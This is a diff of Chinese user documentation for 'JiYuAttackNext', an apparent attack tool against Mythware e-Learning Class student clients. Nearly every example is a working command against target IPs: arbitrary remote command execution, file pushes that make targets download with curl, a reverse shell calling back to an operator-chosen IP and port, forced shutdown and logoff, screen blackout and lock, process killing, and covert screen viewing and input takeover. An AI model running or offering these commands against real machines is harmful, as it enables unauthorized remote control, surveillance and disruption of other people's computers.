+同一行里混用两套写法会报参数错误：要么全部用子命令，要么全部用扁平参数。
 
 <br>
 
@@ -308,7 +383,7 @@ start /wait JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
 ### 发送文本消息
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 ### 发送多行文本
@@ -322,7 +397,7 @@ $message = @'
 
 第四行通知
 '@
-.\JiYuAttackNext.exe -ip 10.49.151.29 -msg $message
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg $message
 ```
 
 CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转成换行；目标端是否按多行显示取决于学生端消息窗口的实现。
@@ -332,7 +407,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 文本保存为 UTF-8 文件，可包含多行内容、空行及中文，也支持带 BOM 的 UTF-8。
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 --msg-file "notice.txt"
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 --msg-file "notice.txt"
 ```
 
 `--msg-file -` 从标准输入读取文本，适合较长内容并避免将全文放入命令行参数；`--msg-file` 与 `-msg` 不可同时使用。
@@ -350,13 +425,13 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 ### 指定目标端口
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -p 4705 -msg "Test message"
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -p 4705 -msg "Test message"
 ```
 
 ### 发送查询命令
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
+.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 ```
 
 ### 使用包含空格的路径
@@ -364,7 +439,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 在 PowerShell 中，用外层单引号包裹整个命令，并用内层双引号包裹路径：
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
+.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
 ```
 
 ### 传送文件到桌面
@@ -372,7 +447,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 以下命令选择本机文件，并通过目标学生端的远程命令能力触发系统自带的 `curl` 下载：
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
+.\JiYuAttackNext.exe remote file -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
 ```
 
 CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件，中断则清理 `.part` 临时文件。UDP 命令未得到目标响应时最多重发 3 次，避免单次丢包造成任务无响应。
@@ -380,7 +455,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 `--file` 可以一次给多个路径，文件与文件夹可以混用：
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
+.\JiYuAttackNext.exe remote file -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
 ```
 
 文件夹按原结构递归展开：上例中的 `D:\课件` 会把其下所有层级的文件按相对路径一起传送，目标桌面出现同名文件夹。重复给出的路径只保留一次；一个文件夹里没有文件，或路径不存在时直接报错，不会静默跳过。
@@ -395,7 +470,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 ### 查询本机信息
 
 ```powershell
-.\JiYuAttackNext.exe -e g
+.\JiYuAttackNext.exe local info
 ```
 
 仅查询运行 CLI 模式的本机，不查询远程目标；未匹配到学生端进程或端口时输出可能不完整。
@@ -423,8 +498,6 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 结束分三层：先请学生端正常退出，等不到进程消失再强制结束，仍被拒绝才走管理员授权；学生端不响应正常退出，`taskkill` 不加 `/F` 也会报成功，所以判定以进程是否真的消失为准。启动会依次查运行中的进程、卸载信息、极域服务所在目录与常见安装目录，拉起后等最多 5 秒确认。结束后学生端又被拉起来时，会提示是守护服务重启了它。进程、端口与程序路径来自 `tasklist`、`netstat` 与 `Get-Process`；路径读不到时（例如学生端以 SYSTEM 运行）显示“不可读”，这不影响结束。列表会标注同目录是否带 `LibTDMaster.dll`，没有这个库的同名进程通常是冒牌货。
 
-结束是分层的：先 `taskkill` 请求正常退出，失败再 `/F` 强制，仍然被拒绝且当前不是管理员时，才把剩下的进程交给 UAC 隐藏助手一次性处理，弹窗里选“是”即可，点“否”会提示授权已取消。
-
 不带选项时按状态决定方向，和界面上那个按钮一样：有进程就结束并打印被结束的进程，没有就启动。`--start` 是强制启动（用于确认方向），`--pid` 只结束指定进程，`--list` 只查看。
 
 启动时依次找：手动 `--exe` → 运行中的真身进程 → 卸载信息里的 `DisplayIcon` → 卸载信息里的 `InstallLocation` → 常见安装目录（含 `Mythware\e-Learning Class` 与中文目录）。拉起后会在 5 秒内轮询确认进程真的起来了，没确认到会提示可能被安全软件拦下；本机已经在运行学生端时不会重复启动。扁平写法对应 `--end-student`、`--end-student-pid`、`--list-student`、`--start-student`、`--student-exe`。
@@ -434,7 +507,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 没有第二台测试设备时，可以把 `-ip` 指向运行程序的本机 IPv4 地址，例如 `-ip 192.168.1.20`。CLI 会照常发送 UDP 报文；本机没有学生端监听对应端口时不会产生可见效果。
 
 ```powershell
-.\JiYuAttackNext.exe -ip 192.168.1.20 -msg "本机测试"
+.\JiYuAttackNext.exe remote message -ip 192.168.1.20 -msg "本机测试"
 ```
 
 仓库提供的 `scripts/test_local_ip.py` 会自动选择本机地址，在空闲 UDP 端口上接收并校验消息、命令、重启、关机、注销和连续发送报文，适合验证协议与发送流程；运行方式见[开发与提交规范](../dev/CONTRIBUTING.md#本机-ip-自测)。
@@ -444,67 +517,75 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 以下命令发送 3 轮消息，相邻两轮之间等待 10 秒，最后一轮结束后不再等待：
 
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
 ```
 
 ### 组合发送消息与命令
 
+子命令一次只做一件事，所以要同时发消息和命令，就写两条命令：
+
 ```powershell
-.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig"
+.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test"
+.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 ```
 
-每轮按消息、命令、重启、关机或注销报文的顺序发送；实际是否执行及执行顺序由目标端决定。
+早期与来源项目那种一行写完的扁平写法仍然保留，它也支持把消息、命令与开关机放在一次调用里：
+
+```powershell
+.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig" -e r
+```
+
+扁平写法每轮按消息、命令、重启、关机或注销报文的顺序发送；实际是否执行及执行顺序由目标端决定。子命令写法没有这种合并能力，两条命令之间也不保证先后顺序，需要顺序时等前一条返回再发下一条。
 
 ### 发送重启、关机或注销指令
 
 ```powershell
 # 重启目标
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e r
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --reboot
 
 # 关闭目标
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e s
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --shutdown
 
 # 注销目标当前登录用户
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e l
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
 ```
 
 ```powershell
 # 倒计时 60 秒后关机，屏幕上显示提示文字
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e s --power-delay 60 --power-text "请保存作业"
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --shutdown --power-delay 60 --power-text "请保存作业"
 
 # 30 秒后重启，并等待程序自行退出（不强制结束）
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e r --power-delay 30 --power-no-force
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --reboot --power-delay 30 --power-no-force
 ```
 
-重启与关机走应用命令通道，倒计时、提示文字与强制标志都在报文里，学生端自己执行并显示倒计时。注销没有独立的极域报文，CLI 模式会通过 `-c` 相同的远程命令通道发送 `shutdown /l`，也没有倒计时；目标是否执行仍取决于学生端的远程命令能力。
+重启与关机走应用命令通道，倒计时、提示文字与强制标志都在报文里，学生端自己执行并显示倒计时。注销没有独立的极域报文，CLI 模式会通过与 `remote command` 相同的通道发送 `shutdown /l`，也没有倒计时；目标是否执行仍取决于学生端的远程命令能力。
 
 ### 远程运行程序与打开网址
 
 ```powershell
-JiYuAttackNext.exe -ip 10.49.151.29 --run "C:/Windows/System32/notepad.exe"
-JiYuAttackNext.exe -ip 10.49.151.1-10 --url example.com
-JiYuAttackNext.exe -ip 10.49.151.29 --run "C:/Program Files/App/app.exe" --run-args "--silent" --run-show 1
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --run "C:/Windows/System32/notepad.exe"
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.1-10 --url example.com
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --run "C:/Program Files/App/app.exe" --run-args=--silent --run-show 1
 ```
 
 ### 黑屏、解锁与退出学生端
 
 ```powershell
-JiYuAttackNext.exe -ip 10.49.151.29 --blackscreen 30 --blackout-text "请回到座位"
-JiYuAttackNext.exe -ip 10.49.151.29 --blackscreen 60 --no-lock
-JiYuAttackNext.exe -ip 10.49.151.29 --unlock
-JiYuAttackNext.exe -ip 10.49.151.29 --exit-student
-JiYuAttackNext.exe -ip 10.49.151.29 --kill 4321
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --blackscreen 30 --blackout-text "请回到座位"
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --blackscreen 60 --no-lock
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --unlock
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --exit-student
+.\JiYuAttackNext.exe teacher appcmd -ip 10.49.151.29 --kill 4321
 ```
 
 ### 反弹终端
 
 ```powershell
 # 随机端口监听，并把回连命令发到目标
-.\JiYuAttackNext.exe -ip 10.49.151.29 --shell
+.\JiYuAttackNext.exe remote shell -ip 10.49.151.29
 
 # 指定本机回连地址与监听端口
-.\JiYuAttackNext.exe -ip 10.49.151.29 --shell --shell-ip 10.49.151.2 --shell-port 9001
-.\JiYuAttackNext.exe -ip 10.49.151.29 -e nc
+.\JiYuAttackNext.exe remote shell -ip 10.49.151.29 --shell-ip 10.49.151.2 --shell-port 9001
 ```
 
 启动后终端会打印终端监听端口与脚本服务端口，连上目标后逐行输入命令，`exit` 或 `quit` 结束并断开。目标没有连回来时输入的指令只会提示未发送，不会静默丢弃。
@@ -512,8 +593,8 @@ JiYuAttackNext.exe -ip 10.49.151.29 --kill 4321
 ### 发现学生机
 
 ```powershell
-JiYuAttackNext.exe --students 12
-JiYuAttackNext.exe --announce 15 --channel 2 --teacher-name "实验教师"
+.\JiYuAttackNext.exe teacher students --seconds 12
+.\JiYuAttackNext.exe teacher students --seconds 15 --channel 2 --teacher-name "实验教师"
 ```
 
 宣告不需要 `-ip`：报文发到会话组播地址，学生端收到后主动登录。发现阶段会先回会话应答与缩略图策略，再请求一次全量上报，因此终端里能直接看到计算机名、登录用户、系统、CPU、内存以及进程与窗口列表。没有任何学生登录时，命令会提示确认网段与频道是否一致。
@@ -521,8 +602,8 @@ JiYuAttackNext.exe --announce 15 --channel 2 --teacher-name "实验教师"
 只想看到学生登录、不需要拉进程与窗口时，用常驻模式：
 
 ```powershell
-JiYuAttackNext.exe teacher students --serve
-JiYuAttackNext.exe teacher students --serve 60 --channel 2 --teacher-name "实验教师"
+.\JiYuAttackNext.exe teacher students --serve
+.\JiYuAttackNext.exe teacher students --serve 60 --channel 2 --teacher-name "实验教师"
 ```
 
 常驻模式会一直按真实教师端的节奏广播（先 `OONC`，半拍后 `NANC` 与 `CANC`，同时每轮补一条会话通道的 `ANNO`），学生端登录后立刻打印该机信息，直到按 Ctrl+C 或到达指定秒数才停止。真实教师端是常驻进程，只发一轮宣告就退出的话，学生端下一次心跳就会判定教师离线，表现成刚登录又掉线。
@@ -532,14 +613,14 @@ JiYuAttackNext.exe teacher students --serve 60 --channel 2 --teacher-name "实�
 ### 缩略图与屏幕观看
 
 ```powershell
-JiYuAttackNext.exe -ip 10.49.151.29 --preview 8
-JiYuAttackNext.exe -ip 10.49.151.29 --view 20 --output-dir \\tmp\frames
-JiYuAttackNext.exe -ip 10.49.151.29 --view 20 --control
+.\JiYuAttackNext.exe teacher screen -ip 10.49.151.29 --preview 8
+.\JiYuAttackNext.exe teacher screen -ip 10.49.151.29 --view 20 --output-dir \\tmp\frames
+.\JiYuAttackNext.exe teacher screen -ip 10.49.151.29 --view 20 --control
 ```
 
 `--preview` 请一帧缩略图，原图存成 `<地址>.jpg`，色度还原后的版本存成 `<地址>_fixed.jpg`。学生端给的是自下而上的 DIB 且色度通道被取反，直接打开会上下颠倒、颜色发绿，因此两个文件都要留一份方便对比；Pillow 不可用时只写原图并在终端提示无法修正。
 
-`--chat` 与图形界面的“聊天消息”页一致：先按 `--channel` 宣告一轮并等待登录，再单播 MESS 类型 `0x800` 的文本，目标没有登录教师会话时直接报错。`--kill-window` 只关窗口不杀进程，句柄可以写成 `0x` 开头的十六进制。`--probe` 只做一次 `4806/TCP` 连接尝试，用来区分端口未开、被防火墙拦截与地址写错三种情况。`--peer` 会被追加到宣告目标里，目标网络过滤组播时用它直接指定对端。
+聊天与关窗口各有自己的子命令：`teacher chat -ip <地址> "内容"` 先按 `--channel` 宣告一轮并等待登录，再单播 MESS 类型 `0x800` 的文本；`teacher closewindow -ip <地址> <句柄或标题>` 只关窗口不杀进程，句柄可以写成 `0x` 开头的十六进制。`teacher screen --probe` 只做一次 `4806/TCP` 连接尝试，用来区分端口未开、被防火墙拦截与地址写错三种情况。`--peer` 会被追加到宣告目标里，目标网络过滤组播时用它直接指定对端。
 
 `--view` 会先把屏幕传输指令发给学生端，再连接 `--tcp-port`（默认 4806）连续接收桌面分片。屏幕内容按 1 KB 分片到达，接收侧按偏移重组，缺片时回一条重传应答补齐。JPEG 帧存成 `<地址>_NNN.jpg`，H.264 帧既存原始码流 `<地址>_NNN.h264`，也用 PyAV（FFmpeg 绑定）解码后逐帧存成 `<地址>_NNN_MMM.png`。加 `--control` 会先申请接管键鼠，学生端的输入只在观看端转动；不加则只观看。命令行没有可转发的交互界面，接管会在观看结束后自动解除，用图形界面观看时才能在画面上直接操作键鼠。
 
@@ -551,11 +632,11 @@ JiYuAttackNext.exe -ip 10.49.151.29 --view 20 --control
 
 - **发送结果**：“已送达”只看网络：端口有没有人接、主机在不在线。学生机收下报文但没执行（没开对应功能、版本不同、频道不对），命令行是看不到的，要确认结果只能看目标屏幕。
 - **循环参数**：`-l` 填几轮、`-t` 填每轮之间等几秒。等待发生在两轮之间，不在每台设备之间。
-- **功能组合**：`-msg`、`-c` 可以与 `-e r`、`-e s`、`-e l` 一起用，一条命令同时发消息和关机。只管本机的 `g`、`break`、`continue` 做完就退出；`--shell` 与 `-e nc` 是独立分支，不会顺带发 `-msg` 或 `-c`。
-- **按名操作**：`--kill` 与 `--kill-window` 填非数字时，会先按 `--students` 的流程发现学生、取回进程/窗口列表，再在本地匹配：先忽略大小写精确匹配，匹配不到再按子串匹配。没发现学生或列表里没有匹配项会直接报错，不会盲发。
-- **交互功能**：`--mouse`、`--key`、`--view-stop`、`--control-stop`，以及不带 `--view` 的 `--control`，都会打开图形界面并定位到对应页面——命令行没有画面窗口可转发事件，停止报文又必须带上原来那个本机端口，所以在窗口里操作才有效。
+- **功能组合**：扁平写法下 `-msg`、`-c` 可以与 `-e r`、`-e s`、`-e l` 一起用，一条命令同时发消息和关机；换了子命令则一次只做一件事，要并发就在一行里写两条命令（或用 `;` 连起来）。只管本机的 `local info`、`local firewall` 做完就退出；`remote shell` 与 `restriction student` 是独立分支，不会顺带发消息或命令。
+- **按名操作**：`teacher appcmd --kill`、`teacher students --kill` 与 `teacher closewindow` 填非数字时，会先按 `teacher students` 的流程发现学生、取回进程/窗口列表，再在本地匹配：先忽略大小写精确匹配，匹配不到再按子串匹配。没发现学生或列表里没有匹配项会直接报错，不会盲发。
+- **交互功能**：`teacher control`、`teacher screen --stop`，以及扁平写法里的 `--mouse`、`--key`、`--control-stop`，都会打开图形界面并定位到对应页面——命令行没有画面窗口可转发事件，停止报文又必须带上原来那个本机端口，所以在窗口里操作才有效。
 - **文本编码**：消息与命令按 `utf-16le` 编码，中文正常，`\n` 也算容量。消息超长自动分条，命令受单条报文容量限制，超了会直接报错。
-- **输出范围**：用 `-c` 不会把目标命令的输出传回当前终端，要用 `--shell` 才有实时回显。
+- **输出范围**：`remote command` 不会把目标命令的输出传回当前终端，要实时回显请用 `remote shell`。
 
 <br>
 
@@ -576,11 +657,11 @@ CLI 模式也会写运行日志，文件是数据目录下的 `cli.log`，与 GU
 | 现象 | 可能原因 | 检查建议 |
 | --- | --- | --- |
 | 提示找不到命令或程序 | 终端不在 EXE 所在目录，或 PowerShell 未加 `.\` 前缀 | 切换到 EXE 所在目录；PowerShell 使用 `.\JiYuAttackNext.exe ...`，cmd 可直接写 `JiYuAttackNext.exe ...`，也可使用绝对路径 |
-| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"` |
+| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"` |
 | 提示“发送成功”，目标无响应 | 地址或端口不匹配、报文被拦截、学生端未监听、目标未执行指令 | 核对目标地址、UDP 端口、学生端状态及目标端执行结果 |
 | 包含空格的路径处理失败 | 路径未完整加引号，或引号在终端传参时发生变化 | 参考包含空格路径的示例，并核对目标端路径 |
-| `-e g` 未显示端口 | 未找到 `Student` 相关进程或其 UDP 监听端口 | 在本机核对进程与监听状态；查询失败时会显示错误原因 |
-| 只有 IP、没有功能参数时无法发送 | 没有生成任何待发送报文 | 指定 `-msg`、`-c` 或相应扩展功能 |
+| `local info` 未显示端口 | 未找到 `Student` 相关进程或其 UDP 监听端口 | 在本机核对进程与监听状态；查询失败时会显示错误原因 |
+| 只有 IP、没有功能参数时无法发送 | 没有生成任何待发送报文 | 补上子命令与动作，例如 `remote message -msg ...`、`remote command -c ...` |
 | 长命令报错 | 命令超过固定报文缓冲区容量 | 缩短命令，检查终端输出的异常信息 |
 | 长消息只显示部分内容或顺序不一致 | 消息被拆成独立报文，未提供接收端重组与可靠交付机制 | 核对目标端实际显示结果；分条发送不能保证合并为单条消息 |
 | `--msg-file` 无法读取 | 文件不存在或文件编码不是 UTF-8 | 核对路径，将文件保存为 UTF-8 编码 |
